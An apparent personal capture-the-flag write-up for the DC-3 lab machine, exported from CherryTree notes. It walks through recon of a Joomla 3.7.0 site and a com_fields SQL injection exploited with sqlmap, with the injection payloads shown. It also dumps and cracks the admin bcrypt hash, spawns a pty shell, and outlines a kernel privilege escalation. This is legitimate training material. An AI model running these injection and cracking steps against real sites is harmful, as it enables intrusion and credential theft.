<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DC-3</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="2019.html">2019</a></p>

<ol>
<li><a href="2019--BasicPenTestingBox.html">BasicPenTestingBox</a></li>
<li><a href="2019--BasicPenTestingBox2.html">BasicPenTestingBox2</a></li>
<li><a href="2019--bee_box.html">bee box</a></li>
<li><a href="2019--BossPlayer.html">BossPlayer</a></li>
<li><a href="2019--CyberChallenge19.html">CyberChallenge19</a></li>
<li><a href="2019--Dawn.html">Dawn</a></li>
<li><a href="2019--DC-1.html">DC-1</a></li>
<li><a href="2019--DC-2.html">DC-2</a></li>
<li><a href="2019--DC-3.html">DC-3</a></li>
<li><a href="2019--DerpNStik.html">DerpNStik</a></li>
<li><a href="2019--EVM.html">EVM</a></li>
<li><a href="2019--Fowsniff.html">Fowsniff</a></li>
<li><a href="2019--Gemini_Inc_1.html">Gemini Inc 1</a></li>
<li><a href="2019--JIS_CTF.html">JIS_CTF</a></li>
<li><a href="2019--mullidae.html">mullidae</a></li>
<li><a href="2019--PumpkinFestival.html">PumpkinFestival</a></li>
<li><a href="2019--PumpkinGarden.html">PumpkinGarden</a></li>
<li><a href="2019--PumpkinRaising.html">PumpkinRaising</a></li>
<li><a href="2019--QuaoarCTFHackfest2016.html">QuaoarCTFHackfest2016</a></li>
<li><a href="2019--Rickdiculously_Easy.html">Rickdiculously Easy</a></li>
<li><a href="2019--silky02.html">silky02</a></li>
<li><a href="2019--silky1.html">silky1</a></li>
<li><a href="2019--Typhoon.html">Typhoon</a></li>
<li><a href="2019--VMS_to_try.html">VMS to try</a></li>
<ol>
<li><a href="2019--VMS_to_try--US_Gov_Conf.html">US Gov Conf</a></li>
<li><a href="2019--VMS_to_try--Gruyere.html">Gruyere</a></li>
</ol>
<li><a href="2019--xss_challenges.html">xss challenges</a></li>
<li><a href="2019--Blue.html">Blue</a></li>
<li><a href="2019--mr_robot.html">mr robot</a></li>
<li><a href="2019--Unfinished_VMS.html">Unfinished VMS</a></li>
<ol>
<li><a href="2019--Unfinished_VMS--CasinoRoyale.html">CasinoRoyale</a></li>
<li><a href="2019--Unfinished_VMS--WinterMute_Straylight.html">WinterMute Straylight</a></li>
<li><a href="2019--Unfinished_VMS--connect_the_dots_(unfinished).html">connect the dots (unfinished)</a></li>
<li><a href="2019--Unfinished_VMS--arsenal.html">arsenal</a></li>
<li><a href="2019--Unfinished_VMS--heist.html">heist</a></li>
<li><a href="2019--Unfinished_VMS--MyHouse_Box.html">MyHouse Box</a></li>
<li><a href="2019--Unfinished_VMS--Sputnik.html">Sputnik</a></li>
<li><a href="2019--Unfinished_VMS--Node.html">Node</a></li>
<li><a href="2019--Unfinished_VMS--HackInOs.html">HackInOs</a></li>
<li><a href="2019--Unfinished_VMS--Seattle.html">Seattle</a></li>
<li><a href="2019--Unfinished_VMS--DC416-Galahad.html">DC416-Galahad</a></li>
</ol>
<li><a href="2019--Not_a_Box.html">Not a Box</a></li>
<ol>
<li><a href="2019--Not_a_Box--securitytreasurehunt_web.html">securitytreasurehunt web</a></li>
<li><a href="2019--Not_a_Box--rpc.html">rpc</a></li>
<li><a href="2019--Not_a_Box--msf_fix.html">msf fix</a></li>
</ol>
<li><a href="2019--ICE.html">ICE</a></li>
</ol></div>
<div class="page"><h1><b><u>DC-3</u></b></h1>root@kali:~# nmap -A -p-  192.168.56.108<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 22:56 EDT<br />Nmap scan report for 192.168.56.108<br />Host is up (0.00045s latency).<br />Not shown: 65534 closed ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-generator: Joomla! - Open Source Content Management<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Home<br />MAC Address: 08:00:27:09:76:3D (Oracle VirtualBox virtual NIC)<br />Device type: general purpose<br />Running: Linux 3.X|4.X<br />OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br />OS details: Linux 3.2 - 4.9<br />Network Distance: 1 hop<br /><br />TRACEROUTE<br />HOP RTT     ADDRESS<br />1   0.45 ms 192.168.56.108<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds<br />root@kali:~# <br /><br /><img src="images/17-1.png" alt="images/17-1.png" /><br /><br />root@kali:~# dirb <a href="http://192.168.56.108">http://192.168.56.108</a> /usr/share/wordlists/dirb/common.txt<br /><br />-----------------<br />DIRB v2.22    <br />By The Dark Raver<br />-----------------<br /><br />START_TIME: Fri Nov  1 22:59:32 2019<br />URL_BASE: <a href="http://192.168.56.108/">http://192.168.56.108/</a><br />WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt<br /><br />-----------------<br /><br />GENERATED WORDS: 4612                                                          <br /><br />---- Scanning URL: <a href="http://192.168.56.108/">http://192.168.56.108/</a> ----<br />==&gt; DIRECTORY: <a href="http://192.168.56.108/administrator/">http://192.168.56.108/administrator/</a>                            <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/bin/">http://192.168.56.108/bin/</a>                                      <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/cache/">http://192.168.56.108/cache/</a>                                    <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/components/">http://192.168.56.108/components/</a>                               <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/images/">http://192.168.56.108/images/</a>                                   <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/includes/">http://192.168.56.108/includes/</a>                                 <br />+ <a href="http://192.168.56.108/index.php">http://192.168.56.108/index.php</a> (CODE:200|SIZE:7109)                         <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/language/">http://192.168.56.108/language/</a>                                 <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/layouts/">http://192.168.56.108/layouts/</a>                                  <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/libraries/">http://192.168.56.108/libraries/</a>                                <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/media/">http://192.168.56.108/media/</a>                                    <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/modules/">http://192.168.56.108/modules/</a>                                  <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/plugins/">http://192.168.56.108/plugins/</a>                                  <br />+ <a href="http://192.168.56.108/server-status">http://192.168.56.108/server-status</a> (CODE:403|SIZE:302)                      <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/templates/">http://192.168.56.108/templates/</a>                                <br />==&gt; DIRECTORY: <a href="http://192.168.56.108/tmp/">http://192.168.56.108/tmp/</a>                                      <br />                                                                               <br />root@kali:~# joomscan -u 192.168.56.108<br />    ____  _____  _____  __  __  ___   ___    __    _  _ <br />   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )<br />  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( <br />  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)<br />			(1337.today)<br />   <br />    --=[OWASP JoomScan<br />    +---++---==[Version : 0.0.7<br />    +---++---==[Update Date : [2018/09/23]<br />    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo<br />    --=[Code name : Self Challenge<br />    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP<br /><br />Processing <a href="http://192.168.56.108">http://192.168.56.108</a> ...<br /><br /><br /><br />[+] FireWall Detector<br />[++] Firewall not detected<br /><br />[+] Detecting Joomla Version<br />[++] Joomla 3.7.0<br /><br />[+] Core Joomla Vulnerability<br />[++] Target Joomla core is not vulnerable<br /><br />[+] Checking Directory Listing<br />[++] directory has directory listing : <br /><a href="http://192.168.56.108/administrator/components">http://192.168.56.108/administrator/components</a><br /><a href="http://192.168.56.108/administrator/modules">http://192.168.56.108/administrator/modules</a><br /><a href="http://192.168.56.108/administrator/templates">http://192.168.56.108/administrator/templates</a><br /><a href="http://192.168.56.108/images/banners">http://192.168.56.108/images/banners</a><br /><br /><br />[+] Checking apache info/status files<br />[++] Readable info/status files are not found<br /><br />[+] admin finder<br />[++] Admin page : <a href="http://192.168.56.108/administrator/">http://192.168.56.108/administrator/</a><br /><br />[+] Checking robots.txt existing<br />[++] robots.txt is not found<br /><br />[+] Finding common backup files name<br />[++] Backup files are not found<br /><br />[+] Finding common log files name<br />[++] error log is not found<br /><br />[+] Checking sensitive config.php.x file<br />[++] Readable config files are not found<br /><br /><img src="images/17-2.png" alt="images/17-2.png" /><br /><br />root@kali:~# searchsploit joomla 3.7<br />--------------------------------------- ----------------------------------------<br /> Exploit Title                         |  Path<br />                                       | (/usr/share/exploitdb/)<br />--------------------------------------- ----------------------------------------<br />Joomla! 3.7 - SQL Injection            | exploits/php/remote/44227.php<br />Joomla! 3.7.0 - 'com_fields' SQL Injec | exploits/php/webapps/42033.txt<br />Joomla! Component ARI Quiz 3.7.4 - SQL | exploits/php/webapps/46769.txt<br />Joomla! Component J2Store &lt; 3.3.7 - SQ | exploits/php/webapps/46467.txt<br />Joomla! Component JomEstate PRO 3.7 -  | exploits/php/webapps/44117.txt<br />Joomla! Component Jtag Members Directo | exploits/php/webapps/43913.txt<br />Joomla! Component Quiz Deluxe 3.7.4 -  | exploits/php/webapps/42589.txt<br />Joomla! Component com_realestatemanage | exploits/php/webapps/38445.txt<br />--------------------------------------- ----------------------------------------<br />Shellcodes: No Result<br />root@kali:~# <br /><br /><img src="images/17-3.png" alt="images/17-3.png" /><br />Used sqlmap:<br /><br /> sqlmap -u "<a href="http://192.168.56.108/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"">http://192.168.56.108/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</a> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br /><br /><br />GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n<br />sqlmap identified the following injection point(s) with a total of 2475 HTTP(s) requests:<br />---<br />Parameter: list[fullordering] (GET)<br />    Type: error-based<br />    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)<br />    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(6753,CONCAT(0x2e,0x7176706a71,(SELECT (ELT(6753=6753,1))),0x7162717671),5132))<br /><br />    Type: time-based blind<br />    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br />    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 9479 FROM (SELECT(SLEEP(5)))JarJ)<br />---<br />[00:02:01] [INFO] the back-end DBMS is MySQL<br />web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)<br />web application technology: Apache 2.4.18<br />back-end DBMS: MySQL &gt;= 5.1<br />[00:02:01] [INFO] fetching database names<br />[00:02:02] [INFO] used SQL query returns 5 entries<br />[00:02:03] [INFO] retrieved: 'information_schema'<br />[00:02:03] [INFO] retrieved: 'joomladb'<br />[00:02:03] [INFO] retrieved: 'mysql'<br />[00:02:04] [INFO] retrieved: 'performance_schema'<br />[00:02:04] [INFO] retrieved: 'sys'<br />available databases [5]:<br />[*] information_schema<br />[*] joomladb<br />[*] mysql<br />[*] performance_schema<br />[*] sys<br /><br />[00:02:04] [WARNING] HTTP error codes detected during run:<br />500 (Internal Server Error) - 2432 times<br />[00:02:04] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.108'<br /><br />[*] ending @ 00:02:04 /2019-11-02/<br /><br />root@kali:~# <br /><br />----&gt; Try to dump the db and it failed, <br />→ So I had to get specific tables and columns<br /><br />root@kali:~# sqlmap -u "<a href="http://192.168.56.108/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"">http://192.168.56.108/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</a> --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering]<br /><br />[09:41:14] [WARNING] running in a single-thread mode. This could take a while<br />[09:41:14] [INFO] retrieved: id                                                <br />[09:41:14] [INFO] retrieved: name                                              <br />[09:41:15] [INFO] retrieved: username                                          <br />[09:41:19] [INFO] retrieved: email                                             <br />[09:41:54] [INFO] retrieved: password                                          <br />[09:47:35] [INFO] retrieved: params                                            <br />                                                                               <br />Database: joomladb<br />Table: #__users<br />[6 columns]<br />+----------+-------------+<br />| Column   | Type        |<br />+----------+-------------+<br />| email    | non-numeric |<br />| id       | numeric     |<br />| name     | non-numeric |<br />| params   | non-numeric |<br />| password | non-numeric |<br />| username | non-numeric |<br />+----------+-------------+<br /><br />[09:49:03] [WARNING] HTTP error codes detected during run:<br />500 (Internal Server Error) - 2628 times<br />[09:49:03] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.108'<br />[09:49:03] [WARNING] you haven't updated sqlmap for more than 61 days!!!<br /><br />[*] ending @ 09:49:03 /2019-11-02/<br /><br /><img src="images/17-4.png" alt="images/17-4.png" /><br /><br />sqlmap -u "<a href="http://192.168.56.108/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"">http://192.168.56.108/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</a> --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C username,password --dump -p list[fullordering]<br /><br />[09:52:33] [INFO] fetching entries of column(s) 'password, username' for table '#__users' in database 'joomladb'<br />[09:52:33] [INFO] used SQL query returns 1 entry<br />[09:52:34] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsV...<br />[09:52:34] [INFO] retrieved: 'admin'<br />Database: joomladb<br />Table: #__users<br />[1 entry]<br />+----------+--------------------------------------------------------------+<br />| username | password                                                     |<br />+----------+--------------------------------------------------------------+<br />| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br />+----------+--------------------------------------------------------------+<br /><br />[09:52:34] [INFO] table 'joomladb.`#__users`' dumped to CSV file '/root/.sqlmap/output/192.168.56.108/dump/joomladb/#__users.csv'<br />[09:52:34] [WARNING] HTTP error codes detected during run:<br />500 (Internal Server Error) - 6 times<br />[09:52:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.108'<br />[09:52:34] [WARNING] you haven't updated sqlmap for more than 61 days!!!<br /><br />[*] ending @ 09:52:34 /2019-11-02/<br /><br /><img src="images/17-5.png" alt="images/17-5.png" /><br /><br />Crack the admin password:<br /><br />Use john to crack:<br />root@kali:~# john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt --rules dc3_pass<br />Using default input encoding: UTF-8<br />Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])<br />Cost 1 (iteration count) is 1024 for all loaded hashes<br />Will run 4 OpenMP threads<br />Press 'q' or Ctrl-C to abort, almost any other key for status<br />snoopy           (?)<br />1g 0:00:00:02 DONE (2019-11-02 09:56) 0.4545g/s 65.45p/s 65.45c/s 65.45C/s angela..alejandro<br />Use the "--show" option to display all of the cracked passwords reliably<br />Session completed<br /><br />$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy<br /><br />Login as admin:<br /><br /><img src="images/17-6.png" alt="images/17-6.png" /><br /><img src="images/17-7.png" alt="images/17-7.png" /><br /><br /><img src="images/17-8.png" alt="images/17-8.png" /><br /><br /><img src="images/17-9.png" alt="images/17-9.png" /><br /><br /><img src="images/17-10.png" alt="images/17-10.png" /><br /><br /><img src="images/17-11.png" alt="images/17-11.png" /><br /><br />$ python -c 'import pty; pty.spawn("/bin/bash")'<br />www-data@DC-3:/$ <br /><br />-&gt; search for exploit kernel exploit using searchsploit and operating system version<br />→ execute kernel exploit to get root, using apache2 to transfer exploit between attacker and target machine<br />→ get the final flag<br /><br /><br /></div></div>
</body></html>